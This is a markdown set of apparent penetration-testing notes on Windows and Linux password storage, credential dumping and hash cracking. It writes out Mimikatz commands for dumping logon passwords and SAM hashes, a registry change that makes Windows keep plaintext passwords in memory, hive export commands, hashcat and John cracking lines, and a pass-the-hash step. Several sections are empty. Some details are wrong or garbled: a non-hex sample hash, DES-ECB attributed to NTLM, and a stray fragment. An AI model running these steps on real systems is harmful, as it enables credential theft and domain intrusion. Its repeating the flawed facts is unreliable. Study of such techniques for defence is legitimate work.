## Passwords

- [Passwords](#passwords)
- [Introduction](#introduction)
  - [Password Storage](#password-storage)
  - [Mimikatz - Obtain Hash](#mimikatz---obtain-hash)
    - [Turn On Plain Text Password Storage In Memory](#turn-on-plain-text-password-storage-in-memory)
    - [Download](#download)
    - [Hack](#hack)
    - [Mimikatz LSADump::SAM](#mimikatz-lsadumpsam)
    - [Mimikatz Pass The Hash](#mimikatz-pass-the-hash)
  - [Responder](#responder)
  - [Password cracking](#password-cracking)
    - [OnlineHashCrack.com](#onlinehashcrackcom)
    - [Cain and abel](#cain-and-abel)
    - [John the Ripper](#john-the-ripper)
    - [HashCat](#hashcat)
    - [THC Hydra](#thc-hydra)
    - [Aircrack-ng](#aircrack-ng)
    - [L0phtcrack and ophcrack](#l0phtcrack-and-ophcrack)
    - [Dictionary Attack](#dictionary-attack)
    - [Spidering :](#spidering-)
    - [Hybrid attacks eg James1](#hybrid-attacks-eg-james1)
    - [Pass The Hash PtH](#pass-the-hash-pth)


## Introduction

HaveIBeenPwned - has my username and password already been hacked?

[haveibeenpwned.com](http://haveibeenpwned.com/)

[Howsecureismypassword.net](http://howsecureismypassword.net/)




### Password Storage

most passwords stored as MD5 or SHA1

Windows System 

      32\CONFIG\SAM          LOCAL USERS    
      C:\WINDOWS\NTDS\NTDS.DIT       DOMAIN USERS

  Windows 10 Passwords are stored as NT hashes which uses UTF16 encoding plus MD-4 hashing

    [Jason, :, 502, :, aad3c435b514a4eeaad3b935b51304fe, :, c46b9e588fa0d112de6f59fd6d58eae3, :, :, :] 

    Username : account type eg 502 = kerberos : LM hash : NT hash

    Note : LM hash is off by default since Windows Vista

      Authentication types 

        LM      uses ASCII character set

        NTLM    NTHash - uses UNICODE character set so much harder to brute force

                Uses DES-ECB algorithm

                Hash Algorithm is MD4(UTF-16-LE(password))  where LE is Little Endian

        NTLM2   Default in Windows since Win2000 and uses HMAC-MD5 algorithm

            Looks like

              admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030

              username:accounttype:LMHash:NTHash
        Kerberos  

      Implement NoLM Group Policy to prevent LM hashes being stored

      Most password crackers crack the LM then use this text to try and crack the NT


Linux

      /etc/passwd    All users can reach this location
      /etc/shadow Only root user can reach this location


### Mimikatz - Obtain Hash

Mimikatz can be used to extract Windows 10 hashes

Hashes have many different types.  See https://hashcat.net/wiki/doku.php?id=example_hashes 

#### Turn On Plain Text Password Storage In Memory

Redgeit as administator => HKLM => System => CurrentControlSet => Control => SecurityProviders => WDigest => UseLogonCredential DWORD 1  and REBOOT PC

#### Download

Download from here https://github.com/gentilkiwi/mimikatz/releases (download and extract the ZIP file and run the x64 exe)

Run x64 Mimikatz as Administrator and run

#### Hack

```bash
# elevate
privilege::debug
# elevate
token::elevate
# log
log 
# or log to named file
log mimikatz.log
# dump passwords
sekurlsa::logonpasswords 
sekurlsa::logonpasswords full
# get hashes
dpapi::cache //load
# get keys
sekurlsa::ekeys
```

#### Mimikatz LSADump::SAM

Get All Hashes From System

```bash
# Export Registry (Powershell)
reg save HKLM\SAM sam.hiv
reg save HKLM\SYSTEM system.hiv
# Mimikatz elevate
privilege::debug
token::elevate
# Mimikatz dump LSA hashes
cd c:\path\to\mimikatz\executable
log hash.txt
lsadump::sam sam.hiv system.hiv
```

Now edit the file so the data is in this format  username:NTLMHash

  Philip:0aca9df100f9bc3a68a50fda1812636g

Copy this file to HashCat and run the command

```bash
hashcat -m 1000 -a 0 --force --show --username hash.txt wordlist1.lst 
```

and any password matches will show up.

#### Mimikatz Pass The Hash

We can now use these credentials to log into a domain!

cal

### Responder

Obtains the hash over the network


### Password cracking

#### OnlineHashCrack.com

https://www.onlinehashcrack.com

#### Cain and abel

#### John the Ripper

John The Ripper : use to find a password from a hash

```bash
john --format=nt hash.txt
```

#### HashCat

```bash
hashcat -m 1000 -a 3 hash.txt
```

#### THC Hydra

#### Aircrack-ng

#### L0phtcrack and ophcrack

#### Dictionary Attack

       splashdata.com

       Daniel Miessler github
       
#### Spidering : 

search in plain text all files on computer, then use these to try as passwords
       
#### Hybrid attacks eg James1

#### Pass The Hash PtH

if hash is obtained, submit it directly

       Combat this -  should only log on to DC with domain admin
                            credentials, also
                            Restricted Admin mode restricts where domain admin
                                          credentials can be used
                                          
Note : live system : might be possible to obtain from memory (RAM)
